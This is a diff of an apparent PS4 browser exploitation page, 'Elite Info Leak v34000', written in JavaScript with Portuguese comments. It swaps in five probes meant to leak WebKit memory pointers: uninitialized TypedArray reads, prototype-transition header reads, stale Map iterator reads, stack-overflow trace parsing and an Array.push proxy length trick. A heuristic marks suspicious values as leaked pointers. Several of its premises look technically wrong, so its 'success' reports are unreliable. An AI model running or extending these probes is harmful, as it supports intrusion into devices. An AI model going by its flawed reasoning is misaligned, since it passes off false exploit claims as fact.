@@ -2,23 +2,44 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Elite Info Leak Suite v33000</title>
-
+<title>PS4 Elite Info Leak v34000</title>
+<style>
+    body { background: #000; color: #ccc; font-family: 'Consolas', monospace; padding: 20px; }
+    h1 { color: #fff; border-bottom: 2px solid #555; text-transform: uppercase; font-size: 18px; padding-bottom: 10px; }
+    button { 
+        width: 100%; padding: 15px; margin-bottom: 10px; 
+        background: #111; color: #0f0; border: 1px solid #333; 
+        cursor: pointer; text-align: left; font-weight: bold; font-size: 12px;
+        transition: background 0.2s;
+    }
+    button:hover { background: #222; border-color: #fff; }
+    #log { 
+        border: 1px solid #333; height: 350px; overflow-y: scroll; 
+        background: #050505; padding: 15px; margin-top: 15px; 
+        white-space: pre-wrap; font-size: 11px;
+    }
+    .clean { color: #666; }
+    .success { 
+        color: #000; background-color: #00ff00; 
+        font-weight: 900; border: 2px solid #fff; padding: 4px; display: block;
+    }
+    .ptr { color: #00ffff; font-weight: bold; }
+</style>
 </head>
 <body>
 
-<h1>SUITE V33000: ELITE INVARIANT VIOLATIONS (TOP 5)</h1>
-<p>Method: Pure Logic. No Simulations. Real Memory Reads.</p>
+<h1>SUITE V34000: RAW POINTER EXTRACTION</h1>
+<p>Target: Uninitialized Memory & Stale Pointers. No Simulations.</p>
 
-<button onclick="testSparseSort()">01. Sparse Array Sort (Heap Hole Read)</button>
+<button onclick="testUninitHeap()">01. TypedArray: Uninitialized Heap Read (Zero-Fill Bypass)</button>
 
-<button onclick="testJSONShrink()">02. JSON.stringify Proxy Resize (OOB Read)</button>
+<button onclick="testProtoLeak()">02. Proto Transition: StructureID/Butterfly Leak</button>
 
-<button onclick="testTreeWalker()">03. TreeWalker DOM Removal (Use-After-Free)</button>
+<button onclick="testMapResidue()">03. Map Iterator: Stale Bucket Read after Clear</button>
 
-<button onclick="testRegExpInput()">04. RegExp.input Static Property Residue</button>
+<button onclick="testStackFrame()">04. Error Recursion: Stack Frame Pointer Extraction</button>
 
-<button onclick="testStackLeak()">05. Error.stack Recursion Frame Pointer</button>
+<button onclick="testPushOOB()">05. Array.push: Proxy Length Mismatch (OOB Read)</button>
 
 <div id="log">Waiting for execution...</div>
 
@@ -33,215 +54,187 @@
         LOG.scrollTop = LOG.scrollHeight;
     }
 
-    // Analisador Forense de Memória
-    function inspect(val, context) {
-        if (val === undefined || val === null) {
-            log(`${context}: Undefined/Null (Clean)`);
+    // Analisador de Memória Crua
+    // Detecta se o valor retornado parece um ponteiro de 64-bit ou lixo de memória
+    function analyze(val, context) {
+        if (val === undefined || val === null || val === 0) {
+            log(`${context}: Clean (${val})`);
             return;
         }
 
-        // 1. Check Numérico: Procuramos ponteiros ou floats "sujos"
+        // 1. Números (Ponteiros muitas vezes aparecem como Ints gigantes ou Floats denormais)
         if (typeof val === 'number') {
             if (Number.isInteger(val)) {
-                // Inteiros pequenos (-1000 a 1000) são lógicos.
-                // Inteiros GIGANTES ou negativos grandes são ponteiros.
+                // Ponteiros Userland geralmente > 0x10000
+                // Ponteiros Kernel (se lidos como signed) < -0x10000
                 if (Math.abs(val) > 0x10000) {
                     log(`[SUCCESS] ${context} LEAKED INT: 0x${Math.abs(val).toString(16)}`, 'success');
                 } else {
                     log(`${context}: Integer ${val} (Clean)`);
                 }
             } else {
-                // Float: NaN ou Infinity podem ser resultado de corrupção
-                // Floats "quebrados" (ex: 5.39e-312) são representações de ponteiros
-                if (val.toString().includes('e-')) {
-                     log(`[SUCCESS] ${context} LEAKED FLOAT PTR: ${val}`, 'success');
+                // Floats estranhos (NaN, Infinity, Denormals)
+                // Um ponteiro lido como float tem exponenciação estranha (ex: e-300)
+                if (val.toString().includes('e-') || isNaN(val)) {
+                     log(`[SUCCESS] ${context} LEAKED FLOAT REPRESENTATION: ${val}`, 'success');
+                     // Tenta converter float para raw bytes (visualização)
+                     try {
+                        const buf = new ArrayBuffer(8);
+                        new Float64Array(buf)[0] = val;
+                        const u32 = new Uint32Array(buf);
+                        log(`    -> Raw Hex: 0x${u32[1].toString(16)}${u32[0].toString(16)}`, 'ptr');
+                     } catch(e){}
                 } else {
-                     log(`${context}: Float ${val} (Check manually)`);
+                     log(`${context}: Float ${val} (Clean)`);
                 }
             }
             return;
         }
 
-        // 2. Check de String: Procuramos lixo de memória
+        // 2. Strings (Buffers não limpos contêm lixo binário)
         if (typeof val === 'string') {
-            if (val.length === 0) {
-                log(`${context}: Empty String (Clean)`);
-            } else if (/^[\x20-\x7E]*$/.test(val)) {
-                log(`${context}: Printable String "${val.substring(0, 20)}..." (Clean)`);
+            if (/[\x00-\x08\x0E-\x1F]/.test(val)) {
+                log(`[SUCCESS] ${context} LEAKED BINARY STRING (Len: ${val.length})`, 'success');
             } else {
-                // Contém caracteres não imprimíveis (binário/lixo)
-                log(`[SUCCESS] ${context} LEAKED BINARY DATA (Length: ${val.length})`, 'success');
+                log(`${context}: String Clean`);
             }
-        } else {
-            // Objeto inesperado?
-            log(`${context}: Returned Type ${typeof val} (Suspicious)`, 'ptr');
         }
     }
 
-    // TESTE 01: Sparse Array Sort (Heap Hole Read)
-    // ALVO: Arrays com "buracos".
-    // LÓGICA: Criamos um array gigante mas vazio. O sort tenta mover itens.
-    // Se o motor não checar se o índice existe antes de ler, ele lê o que estava na RAM antes.
-    function testSparseSort() {
+    // TESTE 01: TypedArray Uninitialized Heap Read
+    // INVARIANTE: `new Uint32Array(N)` deve retornar memória zerada (bzero).
+    // VIOLAÇÃO: Se alocarmos memória muito rápido ou muito grande, o Kernel pode dar páginas "sujas"
+    // de processos antigos para economizar tempo, assumindo que vamos escrever nelas depois.
+    // Nós lemos ANTES de escrever.
+    function testUninitHeap() {
         try {
-            // Cria array esparso: índice 0 existe, depois buraco até 0x10000
-            const arr = [1];
-            arr.length = 0x2000; // 8KB de espaço virtual
-            arr[0x1FFF] = 2;     // Coloca um item no final pra forçar scan completo
+            // Tenta alocar 4MB. Tamanhos maiores aumentam a chance de mmap direto.
+            const arr = new Uint32Array(1024 * 1024);
             
-            // Comparator que gera pressão no GC
-            const compare = (a, b) => {
-                // Aloca memória temporária para forçar o sistema a mover coisas
-                const junk = new Float64Array(100); 
-                return a - b;
-            };
-
-            arr.sort(compare);
-
-            // Varredura: Procuramos qualquer coisa nos buracos que NÃO seja undefined
-            let found = undefined;
-            // Checamos apenas uma amostra para não travar a UI
-            for(let i=1; i < 200; i++) { 
-                if (arr[i] !== undefined) {
-                    found = arr[i];
+            // Verifica amostras. Se encontrar algo != 0, é vazamento.
+            let leaked = 0;
+            // Checa início, meio e fim
+            const checks = [0, 1024, 500000, 1048575];
+            
+            for (let idx of checks) {
+                if (arr[idx] !== 0) {
+                    leaked = arr[idx];
                     break;
                 }
             }
-            inspect(found, "Sparse Sort");
-        } catch(e) { log("Sparse Sort Error: " + e.message); }
+            
+            analyze(leaked, "Uninitialized Heap");
+        } catch(e) { log("Heap Alloc Failed"); }
     }
 
-    // TESTE 02: JSON.stringify Proxy Resize (OOB Read)
-    // ALVO: Serializador JSON.
-    // LÓGICA: Passamos um array 'replacer' que é um Proxy. Quando o JSON lê a chave '0',
-    // nós zeramos o array. O JSON tenta ler a chave '1' (que não existe mais), lendo fora dos limites.
-    function testJSONShrink() {
-        const target = { a: 1, b: 2, c: 3 };
-        const replacer = [0, 1, 2];
+    // TESTE 02: Proto Transition StructureID Leak
+    // INVARIANTE: Propriedades de objetos são acessadas via offsets fixos.
+    // VIOLAÇÃO: Mudamos o `__proto__` para `null`. Isso força o motor a mudar o "StructureID" e o layout.
+    // Se tentarmos ler o objeto como se fosse um array logo em seguida, podemos ler o StructureID antigo ou o Butterfly pointer.
+    function testProtoLeak() {
+        const obj = { a: 1.1, b: 2.2 };
         
-        // Proxy para interceptar a leitura dos índices do replacer
-        const p = new Proxy(replacer, {
-            get(t, k) {
-                if (k === "1") {
-                    // VIOLAÇÃO: O JSON vai pedir o índice 1.
-                    // Nós esvaziamos o array AGORA.
-                    t.length = 0;
-                    // O motor C++ já calculou o ponteiro base. Ele vai somar offset e ler lixo.
-                }
-                return Reflect.get(t, k);
-            }
-        });
+        // Transição violenta de estrutura
+        Object.setPrototypeOf(obj, null);
         
-        try {
-            // O resultado pode conter chaves "estranhas" se vazou memória
-            const json = JSON.stringify(target, p);
-            // Se vazou, o JSON pode ter algo como "undefined": 2 ou chaves corrompidas
-            log("JSON Result: " + json);
-            if (json.includes("undefined") || json.length < 5) {
-                log("[SUCCESS] JSON OOB Triggered behavior anomaly", 'success');
-            }
-        } catch(e) { log("JSON Shrink Error: " + e.message); }
-    }
-
-    // TESTE 03: TreeWalker DOM Removal (Use-After-Free)
-    // ALVO: DOM Iterator (C++).
-    // LÓGICA: O TreeWalker aponta para um nó. Nós removemos esse nó do documento
-    // de dentro do filtro do próprio walker.
-    function testTreeWalker() {
-        const root = document.createElement('div');
-        const child = document.createElement('span');
-        root.appendChild(child);
+        // Tenta ler índice 0. Objetos normais retornam undefined.
+        // Se houver confusão de layout, ele lê o cabeçalho do objeto (8 bytes).
+        // Em WebKit, isso pode vazar o ponteiro da Cell.
+        const val = obj[0]; 
         
-        const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
-            acceptNode: (node) => {
-                if (node === child) {
-                    // VIOLAÇÃO: Remove o nó que está sendo visitado.
-                    root.removeChild(child);
-                    // O walker.currentNode agora aponta para um nó desligado (zumbi)
-                    return NodeFilter.FILTER_ACCEPT;
-                }
-                return NodeFilter.FILTER_SKIP;
-            }
-        });
-        
-        walker.nextNode(); // Trigger
-        
-        // Agora inspecionamos o nó "morto"
-        const dead = walker.currentNode;
-        
-        // Se conseguirmos ler propriedades de 'dead' e elas estiverem corrompidas...
-        try {
-            // Às vezes o UAF se manifesta como ids ou classes estranhas
-            const id = dead.id; 
-            if (id !== "") inspect(id, "TreeWalker UAF ID");
-            else log("TreeWalker Node appears valid (Clean)");
-        } catch(e) {
-            log("[SUCCESS] TreeWalker Access Violation (Crash blocked)", 'success');
-        }
-    }
-
-    // TESTE 04: RegExp.input Static Property Residue
-    // ALVO: RegExpStatics (Buffer global de regex).
-    // LÓGICA: Executamos uma regex numa string gigante. Depois tentamos ler RegExp.input
-    // após a string original ter sido teoricamente coletada pelo GC.
-    function testRegExpInput() {
-        // Escopo local para permitir GC
-        (() => {
-            const huge = "A".repeat(1024 * 1024); // 1MB String
-            const re = /A/;
-            re.exec(huge);
-        })();
-        
-        // Força pressão de memória para rodar GC
-        const trash = new Array(10000).fill(1.1);
-        
-        // RegExp.input deve manter uma cópia ou referência.
-        // Se a referência for "fraca" ou mal gerenciada, lemos memória desalocada.
-        const leak = RegExp.input;
-        
-        if (leak.length > 0 && leak[0] !== "A") {
-            inspect(leak.substring(0, 50), "RegExp Input Corruption");
-        } else if (leak.length === 0) {
-            log("RegExp Input Cleared (Clean)");
+        if (val !== undefined) {
+            analyze(val, "Proto Structure Leak");
         } else {
-            log("RegExp Input Valid (Clean)");
+            log("Proto Transition Clean");
         }
     }
 
-    // TESTE 05: Error.stack Recursion Frame Pointer
-    // ALVO: Stack Walker.
-    // LÓGICA: Causamos um estouro de pilha (Recursion).
-    // O motor tenta gerar o stack trace. Se ele ler além do frame atual,
-    // ele pega ponteiros brutos da stack (endereços de retorno).
-    function testStackLeak() {
+    // TESTE 03: Map Iterator Stale Read after Clear
+    // INVARIANTE: Um iterador deve se tornar inválido ou terminar se o mapa for limpo.
+    // VIOLAÇÃO: Limpamos o mapa e *imediatamente* preenchemos com outros dados de tipos diferentes.
+    // O iterador antigo ainda aponta para o índice de memória X. O que tem em X agora?
+    function testMapResidue() {
+        const m = new Map();
+        const key = {id: 1}; 
+        m.set(key, 0x1337); // Preenche com inteiros
+        
+        const iter = m.values();
+        
+        // Esvazia e Reenche com Floats (estrutura de memória diferente)
+        m.clear();
+        m.set({}, 1.123); 
+        
+        // Tenta avançar o iterador "velho"
+        try {
+            const res = iter.next();
+            if (!res.done) {
+                // Se o valor retornado não for 1.123 nem 0x1337, é lixo de memória.
+                if (res.value !== 1.123 && res.value !== 0x1337) {
+                    analyze(res.value, "Map Stale Read");
+                } else {
+                    log("Map Iterator Clean (tracked correctly)");
+                }
+            } else {
+                log("Map Iterator Correctly Done");
+            }
+        } catch(e) { log("Map Safe"); }
+    }
+
+    // TESTE 04: Error Recursion Stack Frame Pointer
+    // INVARIANTE: Stack trace contém strings de nomes de função e linhas.
+    // VIOLAÇÃO: Estouro de pilha. O formatador de stack trace tenta ler nomes de funções,
+    // mas devido ao estouro, lê os endereços de retorno (Return Address) crus da pilha.
+    function testStackFrame() {
         try {
             const overflow = () => overflow();
             overflow();
         } catch(e) {
             const stack = e.stack;
-            if (!stack) return log("No stack trace available");
-            
-            // Analisa a string da stack procurando hexadecimais (0x...)
-            // WebKit normal: "func@file:line:col"
-            // WebKit vazando: "0x412452452..." ou dados binários
-            const lines = stack.split('\n');
-            let foundPtr = false;
-            
-            lines.forEach(line => {
-                // Regex para encontrar endereços de memória 64-bit (ex: 0x00000008...)
-                const match = line.match(/0x[0-9a-fA-F]{4,}/);
+            if (typeof stack === 'string') {
+                // Procura por padrão de ponteiro hexadecimal de 64-bit (ex: 0x00000008...)
+                // Comum em leaks de WebKit: endereços flat
+                const match = stack.match(/0x[0-9a-fA-F]{6,}/);
+                
                 if (match) {
-                    inspect(match[0], "Stack Trace Pointer");
-                    foundPtr = true;
+                    analyze(match[0], "Stack Frame Pointer");
+                } else {
+                    log("Stack Trace Format Clean (No raw ptrs)");
                 }
-            });
-            
-            if (!foundPtr) log("Stack Trace Format Clean");
+            }
         }
+    }
+
+    // TESTE 05: Array.push Proxy Length Mismatch
+    // INVARIANTE: Array.push confia na propriedade .length.
+    // VIOLAÇÃO: Usamos um Proxy para mentir sobre o length. Dizemos que o array é grande.
+    // O push vai tentar escrever no final. Se ele ler a memória para realocar antes de escrever...
+    function testPushOOB() {
+        const arr = [1.1, 2.2];
+        const p = new Proxy(arr, {
+            get(target, prop, receiver) {
+                if (prop === 'length') {
+                    return 100; // Mentira: dizemos que tem 100 itens
+                }
+                return Reflect.get(target, prop, receiver);
+            }
+        });
+        
+        try {
+            // Push tenta ler array[100] para decidir se precisa crescer o buffer
+            Array.prototype.push.call(p, 3.3);
+            
+            // Verifica se o array original foi corrompido ou cresceu com lixo
+            if (arr.length > 3) {
+                // O índice 2 até 99 deve ser "empty", mas se vazou, terá dados
+                // Checamos o índice 3 (que não existia)
+                analyze(arr[3], "Push OOB Read");
+            } else {
+                log("Push Proxy Clean");
+            }
+        } catch(e) { log("Push Error (Safe)"); }
     }
 
 </script>
 
 </body>
 </html>
-
